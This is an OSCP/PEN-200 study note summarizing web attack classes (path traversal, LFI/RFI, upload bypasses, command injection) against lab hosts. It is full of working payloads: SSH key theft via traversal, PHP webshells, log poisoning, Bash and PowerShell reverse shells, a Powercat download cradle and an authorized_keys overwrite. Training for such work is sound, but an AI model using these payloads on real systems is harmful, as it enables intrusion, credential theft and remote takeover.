---
title: "PEN-200 Chapter 9 - Common Web Application Attacks"
aliases:
  - "PEN-200 Ch 9"
  - "Common Web Application Attacks"
tags:
  - oscp
  - pen-200
  - web
  - directory-traversal
  - lfi
  - rfi
  - file-upload
  - command-injection
  - initial-access
source: "PEN-200 Chapter 9 - Common Web Application Attacks"
chapter: 9
status: summarized
---

# PEN-200 Chapter 9 — Common Web Application Attacks

> [!summary] Chapter focus
> Chapter 9 covers four recurring web attack classes: **Directory Traversal**, **File Inclusion (LFI/RFI)**, **File Upload vulnerabilities**, and **OS Command Injection**. The recurring OSCP pattern is to identify an input that influences a file path or operating-system command, test it carefully, bypass weak filters, and turn the primitive into either **sensitive file disclosure, credentials, or code execution / a shell**.

## Table of Contents

- [[#9.1 Directory Traversal]]
  - [[#9.1.1 Absolute vs Relative Paths]]
  - [[#9.1.2 Identifying and Exploiting Directory Traversals]]
  - [[#9.1.3 Encoding Special Characters]]
- [[#9.2 File Inclusion Vulnerabilities]]
  - [[#9.2.1 Local File Inclusion (LFI)]]
  - [[#9.2.2 PHP Wrappers]]
  - [[#9.2.3 Remote File Inclusion (RFI)]]
- [[#9.3 File Upload Vulnerabilities]]
  - [[#9.3.1 Using Executable Files]]
  - [[#9.3.2 Using Non-Executable Files]]
- [[#9.4 Command Injection]]
  - [[#9.4.1 OS Command Injection]]
- [[#9.5 Wrapping Up]]
- [[#Attack Chain Connection]]
- [[#OSCP Mini Cheat Sheet]]

---

# 9.1 Directory Traversal

Directory Traversal (also called **Path Traversal**) occurs when user-controlled input is used to construct a filesystem path without sufficient validation. The attacker supplies path components such as `../` (Linux/Unix style) or `..\` (Windows style) to move outside the intended web directory and read files elsewhere on the server.

The primary value is usually **information gathering**: users, configuration, logs, credentials, keys, application source, and other sensitive files. In an OSCP machine, this frequently becomes the bridge from **web enumeration → credentials → initial access**.

## 9.1.1 Absolute vs Relative Paths

### Core concept

An **absolute path** specifies the full location starting from the filesystem root. On Linux it starts with `/`.

Examples:

```text
/etc/passwd
/home/kali/.ssh/id_rsa
/var/log/apache2/access.log
```

A **relative path** is resolved from the current directory. `../` means "one directory upward". Multiple sequences move upward multiple levels:

```text
../
../../
../../etc/passwd
```

Once the filesystem root `/` is reached, extra `../` sequences do not move any farther. This is useful in a traversal test when the application’s actual working directory is unknown: use more `../` sequences than are probably necessary.

### Commands from the chapter

```bash
pwd
```

- **Tool:** `pwd`
- **Purpose:** Prints the current working directory.
- **Why here:** Demonstrates the starting point (`/home/kali`) before comparing absolute and relative paths.

```bash
ls /
```

- **Tool:** `ls`
- **Argument:** `/` = filesystem root.
- **Purpose:** Lists top-level directories such as `/etc`, `/home`, `/var`, etc.
- **When useful:** Understanding Linux filesystem layout or verifying a known absolute path.

```bash
cat /etc/passwd
```

- **Tool:** `cat`
- **Argument:** `/etc/passwd` = absolute path.
- **Purpose:** Displays the local account database file.
- **OSCP use:** `/etc/passwd` is a standard Linux traversal/LFI test because it is commonly readable and exposes usernames and home directories.

```bash
ls ../
```

- `../` means one level up.
- From `/home/kali`, this lists `/home`.

```bash
ls ../../
```

- Two levels up from `/home/kali`, reaching `/`.

```bash
ls ../../etc
```

- Uses a relative path to list `/etc`.

```bash
cat ../../etc/passwd
```

- Reads `/etc/passwd` using a relative path.
- Demonstrates exactly the path behavior abused in traversal vulnerabilities.

```bash
cat ../../../../../../../../../../../etc/passwd
```

- Uses deliberately excessive traversal sequences.
- **Why useful:** If you do not know how deep the application is under the web root, excessive `../` sequences can still land at `/` and then resolve `etc/passwd`.

> [!tip] OSCP habit
> If a path parameter looks vulnerable and you do not know the server-side directory depth, try several traversal depths or deliberately use many `../` sequences.

---

## 9.1.2 Identifying and Exploiting Directory Traversals

### How to identify candidates

Do not test only obvious text boxes. Enumerate the entire application:

- Hover over buttons and links.
- Follow all reachable pages.
- Inspect URL parameters.
- Review page source when useful.
- Look especially for parameters whose **values look like filenames or paths**.

Example from the chapter:

```text
https://example.com/cms/login.php?language=en.html
```

This reveals three clues:

1. `login.php` suggests **PHP**.
2. `language=en.html` suggests the application may load a file based on user input.
3. `/cms/` shows that the application is in a subdirectory of the web root.

A parameter like this should trigger tests using alternate filenames and traversal sequences.

### Lab host mapping

The chapter adds the target hostname to `/etc/hosts`:

```text
127.0.0.1 localhost
127.0.1.1 kali
192.168.50.16 mountaindesserts.com
```

- **File:** `/etc/hosts`
- **Purpose:** Local hostname-to-IP mapping when the lab application expects a specific hostname / virtual host.
- ==**OSCP use:** If browsing by IP does not return the expected site, inspect redirects, certificates, page content, and virtual-host clues; then add the hostname to `/etc/hosts`.==

### Vulnerable parameter

The application exposes:

```text
http://mountaindesserts.com/meteor/index.php?page=admin.php
```

==The `page` parameter appears to include `admin.php` into `index.php`. A traversal test replaces `admin.php` with a path to `/etc/passwd`:==

```text
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
```

If the response contains `/etc/passwd`, the parameter permits traversal.

### Moving from file read to credentials

After reading `/etc/passwd`, inspect users and home directories. The chapter finds user `offsec` and tries the default SSH private-key path:

```text
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```

This successfully retrieves the private key.

> [!important] Why `/etc/passwd` matters
> It is not normally a password file on modern Linux. Its value in traversal is that it reveals **valid usernames, UIDs, shells, and home directories**, which lets you construct paths such as `/home/<user>/.ssh/id_rsa`.

### Prefer raw HTTP tooling after finding a lead

Browsers may reformat responses. The chapter recommends moving to **Burp Suite, cURL, or a script** once a likely vulnerability is identified.

```bash
curl 'http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa'
```

- **Tool:** `curl`
- **Purpose:** Sends the HTTP request and returns a cleaner raw response.
- **Why useful:** Easier to preserve multiline keys, source code, and binary/text responses than copying from a browser.

### Using a stolen SSH key

==Save the returned key as `dt_key`, then:==

```bash
ssh -i dt_key -p 2222 offsec@mountaindesserts.com
```

- **Tool:** `ssh`
- **`-i dt_key`:** Use `dt_key` as the identity/private-key file.
- **`-p 2222`:** Connect to non-default SSH port 2222.
- **Target:** `offsec@mountaindesserts.com`.

SSH rejects the key if its local permissions are too permissive, so the chapter fixes them:

```bash
chmod 400 dt_key
```

- **Tool:** `chmod`
- **`400`:** Owner can read; group and others get no permissions.
- **Why:** OpenSSH refuses private keys accessible by other users.

Then retry:

```bash
ssh -i dt_key -p 2222 offsec@mountaindesserts.com
```

This produces shell access as `offsec`.

### Windows traversal targets

A good Windows traversal test file is:

```text
C:\Windows\System32\drivers\etc\hosts
```

For IIS, useful paths include:

```text
C:\inetpub\logs\LogFiles\W3SVC1\
C:\inetpub\wwwroot\web.config
```

`web.config` can contain usernames, passwords, connection strings, or other sensitive settings.

Windows path tests should include both styles:

```text
../
..\
```

Some Windows-hosted applications normalize one style but not the other.

---

## 9.1.3 Encoding Special Characters

Filters often look for literal malicious sequences such as `../`. URL/percent encoding can change the representation seen by a naïve filter while the server later decodes the value.

==To find URL encoding,== we can use python code like this:

```
from urllib.parse import quote

print(quote("/", safe=""))   # %2F
```

For Apache 2.4.49 (the chapter’s example), plain traversal attempts fail:

```bash
curl 'http://192.168.50.16/cgi-bin/../../../../etc/passwd'
```

```bash
curl 'http://192.168.50.16/cgi-bin/../../../../../../../../../../etc/passwd'
```

The dots are then encoded as `%2e`:

```bash
curl 'http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
```

- `%2e` = `.`
- `%2e%2e/` = `../` after decoding.
- **Purpose:** Bypass a filter that only blocks the literal `../` representation.

> [!tip] Encoding reminder
> When a payload works conceptually but is blocked, test whether the problem is parsing or filtering. Common encodings you repeatedly need in this chapter include `%2e` for `.`, `%20` for a space, `%3B` for `;`, `%26` for `&`, `%22` for `"`, `%2F` for `/`, and `%3E` for `>`.

---

# 9.2 File Inclusion Vulnerabilities

File Inclusion is related to traversal but has a critical difference:

- **Directory Traversal:** generally reads a file’s contents.
- **File Inclusion:** causes a file to be **included in the application’s running code**.

For an executable server-side file such as PHP, inclusion may execute the code instead of merely displaying its source. This is why identifying LFI correctly matters: an apparent file-read bug may be transformable into **RCE**.

---

## 9.2.1 Local File Inclusion (LFI)

### Key idea

An LFI allows inclusion of a file already present on the target. ==To turn LFI into code execution, you need a local file that contains code you control.== The chapter demonstrates **log poisoning**:

1. Find an includable log file.
2. Identify a field you can control that gets written into the log.
3. Put PHP code into that field.
4. Include the poisoned log through LFI.
5. The PHP code executes.

### Inspecting Apache access logs

```bash
curl 'http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log'
```

The Apache access log reveals that the **User-Agent** is recorded. Because the client controls User-Agent, it can be poisoned.

### Burp workflow

**Tools:** Burp Proxy / HTTP history / Repeater.

Workflow:

1. Browse the vulnerable page through Burp.
2. Locate the request under **HTTP history**.
3. Send it to **Repeater**.
4. ==Modify the `User-Agent` header.==
5. Send the request to write the payload into `access.log`.
6. Change the vulnerable `page` parameter so the app includes `access.log`.

You can modify your agent browser using curl also:
```
curl -A "Mozilla Browser" http://target/
or, put command
curl -A "hello-test" http://target/
```

### PHP code written into the log

```php
<?php echo system($_GET['cmd']); ?>
```

- `$_GET['cmd']`: Reads a `cmd` parameter from the request.
- `system(...)`: Executes an operating-system command.
- `echo`: Displays command output in the response.

The log file path used by the LFI is:

```text
../../../../../../../../../var/log/apache2/access.log
```

==Then add a second URL parameter, for example:==

```text
&cmd=ps
```

- `&` separates URL query parameters.
- `ps` is a safe verification command showing processes.

The chapter then tests:

```text
cmd=ls -la
```

==A literal space causes trouble, so the space is encoded:==

```text
cmd=ls%20-la
```

- `%20` = space.

### ==From command execution to reverse shell==

==Basic Bash TCP reverse shell:==

```bash
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
```

Because PHP `system()` may invoke `/bin/sh`, and the `/dev/tcp` syntax is Bash-specific, force Bash explicitly:

```bash
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```

- **`bash -c "..."`:** Execute the supplied string using Bash.
- **`bash -i`:** Interactive Bash shell.
- **`>& /dev/tcp/IP/PORT`:** Redirect output to a TCP connection.
- **`0>&1`:** Redirect stdin to the same connection.

==URL-encoded version from the chapter:==

```text
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

Start the listener first:

```bash
nc -nvlp 4444
```

- **Tool:** Netcat (`nc`).
- **`-n`:** Numeric addresses; no DNS lookup.
- **`-v`:** Verbose.
- **`-l`:** Listen mode.
- **`-p 4444`:** Local listening port.
- **Purpose:** Receive the reverse connection.

The shell arrives as the web-server user (`www-data` in the Linux example).

### Windows LFI note

The concept is the same, but paths differ. For XAMPP, Apache logs may be under:

```text
C:\xampp\apache\logs\
```

The payload language must match the server-side technology. PHP `system()` is OS-independent, but the command you execute must fit Linux or Windows.

The chapter also notes that inclusion bugs can exist in technologies beyond PHP (for example JSP, ASP/ASP.NET, Perl, and Node.js); the code written into a poisonable file must match the application/runtime.

---

## 9.2.2 PHP Wrappers

PHP wrappers can alter how PHP accesses a resource. The chapter focuses on:

- `php://filter` — useful for reading PHP source without executing it.
- `data://` — can embed code/data directly and, when allowed, achieve code execution.

### `php://filter` — read PHP source

Normal inclusion:

```bash
curl 'http://mountaindesserts.com/meteor/index.php?page=admin.php'
```

==If this is LFI, PHP code is executed server-side, so you may see only rendered output rather than source.==

==Try the wrapper without a transform:==

```bash
curl 'http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php'
```

- **`php://filter`:** PHP stream wrapper.
- **`resource=admin.php`:** File/stream to process.

To force source into printable Base64 text:

```bash
curl 'http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php'
```

- **`convert.base64-encode`:** Encodes the resource before inclusion, preventing the PHP source from being interpreted as PHP code in the usual way and making it retrievable as Base64 text.

Decode the captured Base64 locally:

```bash
echo '<BASE64_DATA>' | base64 -d
```

- **`echo`:** Outputs the captured string.
- **Pipe `|`:** Passes it to the next command.
- **`base64 -d`:** Decodes Base64.

The chapter’s decoded `admin.php` reveals **MySQL connection credentials**. This is an important OSCP pivot: source disclosure often produces reusable passwords or database credentials.

### ==`data://` — execute embedded PHP==

Plain-text data wrapper example:

```bash
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

- **`data://text/plain,`**: Treat following content as inline plaintext data.
- Embedded PHP calls `system('ls')`.
- `%20` encodes spaces.

==If filters block words like `system`, Base64-encode the PHP first:==

```bash
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
```

- **`echo -n`:** Do not append a newline (important so the encoded payload is exactly the intended PHP string).
- **`base64`:** Encodes the PHP snippet.

The chapter’s resulting payload is:

```text
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
```

Use it with `data://`:

```bash
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

- **`;base64`** tells the data wrapper that the embedded content is Base64 encoded.
- **`&cmd=ls`** supplies the command consumed by `$_GET["cmd"]`.

> [!warning] Requirement
> `data://` inclusion for code execution requires PHP’s `allow_url_include` setting to be enabled. It is disabled by default in current PHP versions.

---

## 9.2.3 Remote File Inclusion (RFI)

RFI includes a file from a **remote** location (for example over HTTP or SMB) and executes it in the web application’s context. I==t is less common because PHP generally requires `allow_url_include` to be enabled.==

### Kali webshell used in the chapter

```bash
cat /usr/share/webshells/php/simple-backdoor.php
```

- **Tool:** `cat`.
- **Purpose:** Review the included PHP webshell before using it.
- The script accepts `cmd` and executes it with PHP `system()`.

Example webshell usage shown by the chapter:

```text
http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
```

### Serve the webshell from Kali

From `/usr/share/webshells/php/`:

```bash
python3 -m http.server 80
```

- **`python3 -m`:** Run a Python module as a script.
- **`http.server`:** Built-in simple HTTP server.
- **`80`:** Listen on TCP/80.
- **Web root:** Current working directory.
- **Why:** Makes `simple-backdoor.php` reachable by the target.

### Trigger RFI and execute a command

```bash
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```

- `page=http://<KALI>/simple-backdoor.php` tells the vulnerable app to include your hosted script.
- `&cmd=ls` passes a command to the webshell.

Once command execution works, use the same listener/reverse-shell pattern as with LFI.

> [!tip] LFI vs RFI mental model
> **LFI:** “Can I execute something already on the target?”  
> **RFI:** “Can I make the target fetch and execute something I host?”

---

# 9.3 File Upload Vulnerabilities

The chapter groups upload weaknesses into three broad categories:

1. **Executable upload:** Upload a server-side script/webshell and access it.
2. **Upload + another vulnerability:** For example, path traversal in the uploaded filename to write outside the intended upload directory.
3. **User-interaction attacks:** For example malicious documents/macros; this category is acknowledged but not the chapter’s focus.

For OSCP, focus on whether you can control:

- file content,
- extension,
- MIME/content type,
- filename,
- destination path,
- post-upload URL/location,
- rename behavior,
- overwrite behavior.

---

## 9.3.1 Using Executable Files

### Identify the upload mechanism

Look at the application’s purpose. CMSs may have avatar/media uploads; business sites may have résumé/case/document uploads. Do not skip enumeration just because no upload link is obvious.

The example application appears to run **XAMPP on Windows** and offers an image upload.

Create a harmless test file:

```bash
echo "this is a test" > test.txt
```

- **`>`:** Redirects output into `test.txt`, overwriting it if it exists.
- **Purpose:** Confirm whether the upload actually restricts files to images.

The text file uploads successfully, so validation is weak.

### Bypass extension blacklist

==Uploading `simple-backdoor.php` is blocked because `.php` is blacklisted. The chapter suggests two common bypass families:==

- ==Alternative PHP extensions such as `.phps` or `.php7`.==
- ==Case variation, e.g. `.pHP`, if the blacklist comparison is case-sensitive.==

The example renames the webshell to:

```text
simple-backdoor.pHP
```

It uploads successfully into an `uploads` directory.

### Execute the uploaded webshell

```bash
curl 'http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir'
```

- `cmd=dir` executes the Windows `dir` command through the webshell.
- **Result:** Confirms code execution and discloses the filesystem location (`C:\xampp\htdocs\meteor\uploads`).

### Reverse shell on Windows

Start a listener:

```bash
nc -nvlp 4444
```

The chapter uses PowerShell to Base64-encode a reverse-shell command so special characters survive transport.

Start PowerShell on Kali:

```bash
pwsh
```

Store the reverse shell in `$Text`:

```powershell
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

Convert it to UTF-16LE bytes (the encoding expected by Windows PowerShell `-EncodedCommand` / `-enc`):

```powershell
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
```

Base64-encode those bytes:

```powershell
$EncodedText = [Convert]::ToBase64String($Bytes)
```

Display the result:

```powershell
$EncodedText
```

Exit PowerShell:

```powershell
exit
```

Send it through the uploaded webshell:

```bash
curl 'http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20<BASE64_PAYLOAD>'
```

- `%20` = spaces.
- **`powershell -enc <BASE64_PAYLOAD>`:** Starts Windows PowerShell and runs the Base64-encoded command.

The listener receives a PowerShell shell. In the chapter’s example, `whoami` returns `nt authority\system`, showing why checking the privilege level of the web application is critical.

### Kali’s bundled webshells

```bash
ls -la /usr/share/webshells
```

- **`-l`:** Long listing.
- **`-a`:** Include hidden entries.
- Shows webshell directories for technologies such as ASP, ASPX, CFM, JSP, Perl, and PHP.

> [!tip] OSCP upload checklist
> After uploading, always answer: **Where is the file? Can I reach it over HTTP? Does the server execute this extension? Can I change case/extension? Can I rename after upload? Can I overwrite an existing file?**

---

## 9.3.2 Using Non-Executable Files

An unrestricted upload is not necessarily RCE. If uploaded content is stored but never executed, combine the upload with another weakness. The chapter combines it with **directory traversal in the multipart filename** to write outside the upload directory.

### Confirm technology changes

The updated application on port 8000 appears not to use PHP. The chapter probes likely old PHP paths:

```bash
curl 'http://mountaindesserts.com:8000/index.php'
```

```bash
curl 'http://mountaindesserts.com:8000/meteor/index.php'
```

```bash
curl 'http://mountaindesserts.com:8000/admin.php'
```

All return 404, supporting the inference that the application stack changed.

### Burp upload-path test

Upload `test.txt`, intercept/replay the multipart POST in Burp, and change the multipart filename to:

```text
../../../../../../../test.txt
```

==Changing the filename to ../test.txt is not possible locally, it should be done in burp or curl command while uploading!==
This tests whether the backend trusts the client-supplied filename and joins it directly to an upload path.

> [!warning] Real assessments
> Blindly overwriting files can break a production system. Confirm scope and risk before writing to sensitive paths.

### Why privileges matter

Dedicated web servers often run under low-privilege identities (`www-data`, IIS application-pool identities, etc.), but custom applications are sometimes launched as `root` or `Administrator`. If a traversal upload runs with high privilege, a write primitive can become immediate system compromise.

### Overwrite root’s `authorized_keys`

Generate an SSH keypair:

```bash
ssh-keygen
```

The chapter saves it as `fileup` and uses no passphrase.

- **Tool:** `ssh-keygen`.
- **Purpose:** Generate a private/public SSH key pair you control.
- Output files: `fileup` (private) and `fileup.pub` (public).

Create an `authorized_keys` file containing the public key:

```bash
cat fileup.pub > authorized_keys
```

- Reads `fileup.pub` and writes it to a file named `authorized_keys`.

Upload it while modifying the multipart filename to:

```text
../../../../../../../root/.ssh/authorized_keys
```

If the application writes with enough privilege, root’s SSH authorization file is overwritten with your key.

### Connect using the private key

Because the hostname was used earlier for a different lab host, the stored SSH host key may conflict. The chapter deletes the local host-key cache:

```bash
rm ~/.ssh/known_hosts
```

- **Tool:** `rm`.
- **Purpose here:** Remove saved SSH host keys to avoid the mismatch caused by the lab hostname now pointing at a different machine.
- **Caution:** In real environments, do not casually remove host-key history; a mismatch can indicate a MITM or server change. In a disposable lab this is expected.

Then connect:

```bash
ssh -p 2222 -i fileup root@mountaindesserts.com
```

- **`-p 2222`:** SSH service port.
- **`-i fileup`:** Use your generated private key.
- **Result:** Root SSH access if the upload successfully replaced `/root/.ssh/authorized_keys` and root login is permitted.

---

# 9.4 Command Injection

Command Injection occurs when user input becomes part of an operating-system command and can change what is executed. The key OSCP question is:

> **Does this input eventually reach a shell or command interpreter?**

Applications should use safe APIs / fixed argument structures rather than concatenating untrusted input into a shell command. Filters are often incomplete, so testing separators, encodings, alternate command forms, and shell differences can expose bypasses.

---

## 9.4.1 OS Command Injection

### Discover the sink

The example web app accepts a Git command to clone a repository. Because it displays and executes a command derived from user input, it is a strong command-injection candidate.

Burp shows the relevant POST parameter is:

```text
Archive
```

### Use cURL to reproduce the request

Direct command test:

```bash
curl -X POST --data 'Archive=ipconfig' 'http://192.168.50.189:8000/archive'
```

- **`curl`:** HTTP client.
- **`-X POST`:** Explicitly use POST.
- **`--data 'Archive=ipconfig'`:** Send form data in the request body.
- **Result:** The application detects and blocks this obvious injection attempt.

Backtrack to accepted input:

```bash
curl -X POST --data 'Archive=git' 'http://192.168.50.189:8000/archive'
```

The response displays Git help, confirming that the backend actually executed `git`.

Test a Git subcommand:

```bash
curl -X POST --data 'Archive=git version' 'http://192.168.50.189:8000/archive'
```

The output includes:

```text
git version 2.35.1.windows.2
```

This both confirms arbitrary Git subcommands and fingerprints the target as **Windows**.

### Bypass the filter with a command separator

The chapter tries a URL-encoded semicolon:

```bash
curl -X POST --data 'Archive=git%3Bipconfig' 'http://192.168.50.189:8000/archive'
```

- `%3B` = `;`.
- After decoding, the command becomes effectively `git;ipconfig`.
- Both commands execute.

Other separators to remember conceptually:

```text
;
&&
&
```

Exact behavior depends on whether the backend invokes CMD, PowerShell, Bash, `sh`, or another interpreter.

### Identify the command interpreter

==The chapter uses this cross-shell detection snippet:==

```text
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

URL-encoded in the request:

```bash
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' 'http://192.168.50.189:8000/archive'
```

The response prints `PowerShell`, so injected commands are being interpreted by PowerShell.

### Powercat reverse shell (windows)

Powercat is a PowerShell implementation of Netcat included with Kali. Copy it to the current directory:

```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
```

- **`cp <source> .`:** Copy `powercat.ps1` into the current directory.
- **Why:** Makes it easy to serve with Python’s HTTP server.

Serve the current directory:

```bash
python3 -m http.server 80
```

Start a listener in another terminal:

```bash
nc -nvlp 4444
```

PowerShell command used on the target:

```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
```

Breakdown:

- **`New-Object System.Net.Webclient`**: Creates a web client.
- **`.DownloadString("http://.../powercat.ps1")`**: Downloads the Powercat script into memory.
- **`IEX` / `Invoke-Expression`**: Executes the downloaded script text in memory, defining the `powercat` function.
- **`powercat -c 192.168.119.3`**: Connect back to the attack host.
- **`-p 4444`**: Destination port.
- **`-e powershell`**: Execute PowerShell over the connection.

URL-encoded injection request:

```bash
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' 'http://192.168.50.189:8000/archive'
```

You should observe two things:

1. The Python HTTP server logs a `GET /powercat.ps1` request from the target.
2. Netcat receives a PowerShell reverse shell.

> [!tip] OSCP command-injection workflow
> Start with a harmless command, identify filtering, find an accepted baseline, add separators/encoding, fingerprint OS and interpreter, then move to a reliable reverse shell.

---

# 9.5 Wrapping Up

The chapter connects four web primitives that frequently turn into initial access:

- **Directory Traversal:** escape the intended path and read files.
- **File Inclusion:** include local/remote content; with executable content this can become RCE.
- **File Upload:** place controlled content on the server; either execute it directly or combine upload with another weakness such as path traversal.
- **Command Injection:** make the application execute additional operating-system commands.

The exploitation details depend on the application language, framework, web server, operating system, file permissions, and interpreter. Therefore, the repeated lesson is to **fingerprint the technology first**, then tailor the technique.

These attacks can provide:

- **External initial access** when a public web application is vulnerable.
- **Lateral movement / pivot opportunities** when the vulnerable web application is an internal service reached after an earlier foothold.

---

# Tools and What They Are For

| Tool / feature | What it does in this chapter | When to reach for it |
|---|---|---|
| **Browser / Firefox** | Initial application mapping, hovering links, locating forms/parameters | Early web enumeration |
| **Burp Proxy / HTTP history** | Captures exact requests | When you need to see parameters, headers, multipart uploads |
| **Burp Repeater** | Manually edits/replays requests | Testing traversal, LFI, headers, command injection, upload filenames |
| **Burp Intercept** | Modifies a request before the browser sends it | Changing multipart `filename` for traversal writes |
| **cURL** | Sends precise HTTP requests and shows raw responses | Reproducible testing after discovering a candidate vulnerability |
| **SSH** | Uses recovered/generated keys for shell access | When traversal/source disclosure/upload yields SSH credentials or authorized keys |
| **chmod** | Restricts private-key permissions | Before using a retrieved SSH private key |
| **Netcat (`nc`)** | Listens for reverse shells | Before triggering LFI/upload/command-injection shell payloads |
| **Python `http.server`** | Serves payloads from Kali | RFI and Powercat/download-cradle techniques |
| **Base64** | Encodes/decodes data | PHP source via `php://filter`, filter bypasses, PowerShell `-enc` |
| **PowerShell / `pwsh`** | Builds/encodes Windows shell payloads | Windows targets and PowerShell command execution |
| **Powercat** | PowerShell reverse-shell utility | When command injection executes in PowerShell |
| **Kali webshells** | Ready-made server-side scripts | File upload or RFI once target language is known |
| **ssh-keygen** | Generates attacker-controlled SSH keypair | File-write primitives that can target `authorized_keys` |
| **Git** | In the example, the allowed command used to bypass a command filter | Establishing a working baseline and OS fingerprinting |

---

# Attack Chain Connection

`Recon → Enumeration → Initial Access → Privilege Escalation → Credentials → Pivoting → AD → Proof`

## Recon

Chapter 9 is not primarily about network discovery, but web recon sets up everything that follows. Identify HTTP/HTTPS services, ports, hostnames/virtual hosts, application stacks, and likely technologies.

**Useful clues from this chapter:**

- `.php` paths → PHP.
- XAMPP icon/content → likely Apache/PHP stack, often on Windows in the example.
- IIS clues → Windows-specific paths such as `web.config` and IIS logs.
- A Git interface → possible OS command execution behind the application.

## Enumeration

This is where most Chapter 9 work begins.

- Hover links and inspect parameters.
- Identify file-valued parameters (`page=admin.php`, `language=en.html`).
- Probe hidden/old endpoints.
- Inspect requests with Burp.
- Test uploads, duplicate filenames, extension handling, and post-upload location.
- Determine whether input is passed to an operating-system command.

**Chapter 9 is strongest at this stage.**

## Initial Access

This chapter provides several direct foothold paths:

- Traversal → steal `id_rsa` → SSH.
- LFI + log poisoning → RCE → reverse shell.
- LFI + `data://` → RCE.
- RFI → remotely hosted webshell → RCE.
- Executable file upload → webshell → reverse shell.
- Non-executable upload + path traversal → overwrite `authorized_keys` → SSH.
- Command injection → Powercat/PowerShell reverse shell.

**Primary chain position:** `Enumeration → Initial Access`.

## Privilege Escalation

Chapter 9 does not teach a full privilege-escalation methodology, but always check **which account the web application runs as** after exploitation.

Examples:

- `www-data` may require local privilege escalation.
- A poorly deployed application may already run as `root`, `Administrator`, or `SYSTEM`.
- In the upload example, the obtained shell is `NT AUTHORITY\SYSTEM`; no further local privesc is needed.

## Credentials

This chapter is highly relevant to credential discovery:

- `/etc/passwd` → usernames/home directories.
- `~/.ssh/id_rsa` → SSH private key.
- `php://filter` → application source code.
- Source/config files → database usernames/passwords.
- `web.config` on IIS → potential connection strings/credentials.

Always test recovered passwords for **reasonable reuse** on other exposed services/accounts in the lab.

## Pivoting

Once a web attack yields a foothold, inspect network interfaces, routes, and internal services. The same vulnerable patterns may exist on **internal-only web apps**, turning Chapter 9 techniques into lateral-movement tools after tunneling/pivoting.

## Active Directory

Chapter 9 is not an AD chapter, but it can be the entrance into AD:

- A Windows web server may be domain joined.
- Recovered config credentials may be domain credentials.
- A web shell may expose service-account context or secrets.
- After foothold, continue with host/domain enumeration and credential access from later PEN-200 material.

## Proof

After compromise, collect the required OSCP proof according to exam/lab rules. Keep a reproducible record of:

- vulnerable URL/parameter,
- payload,
- returned sensitive file or command output,
- shell method,
- user/privilege context (`whoami`, `id`),
- proof-file location/content as required.

> [!summary] Where Chapter 9 fits best
> **Recon → Enumeration → _[Chapter 9 techniques]_ → Initial Access → Privilege Escalation / Credentials → Pivoting → AD → Proof**

---

# OSCP Mini Cheat Sheet

> [!note] Use only on systems you are authorized to test.

```bash
# 1. Linux traversal baseline
curl 'http://TARGET/index.php?page=../../../../../../etc/passwd'

# 2. Over-traverse when depth is unknown
curl 'http://TARGET/index.php?page=../../../../../../../../../../../etc/passwd'

# 3. URL-encoded dots for ../ filter bypass
curl 'http://TARGET/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'

# 4. Common Linux key path after /etc/passwd reveals USER
curl 'http://TARGET/index.php?page=../../../../../../home/USER/.ssh/id_rsa'

# 5. Fix SSH private-key permissions
chmod 400 id_rsa

# 6. SSH with key and non-standard port
ssh -i id_rsa -p 2222 USER@TARGET

# 7. LFI: inspect Apache access log
curl 'http://TARGET/index.php?page=../../../../../../var/log/apache2/access.log'

# 8. LFI source disclosure with php://filter
curl 'http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=admin.php'

# 9. Decode captured Base64
printf '%s' '<BASE64>' | base64 -d

# 10. PHP data:// code execution test (requires allow_url_include)
curl "http://TARGET/index.php?page=data://text/plain,<?php%20echo%20system('id');?>"

# 11. Serve payloads for RFI / download cradle
python3 -m http.server 80

# 12. Start reverse-shell listener
nc -nvlp 4444

# 13. RFI with hosted PHP webshell
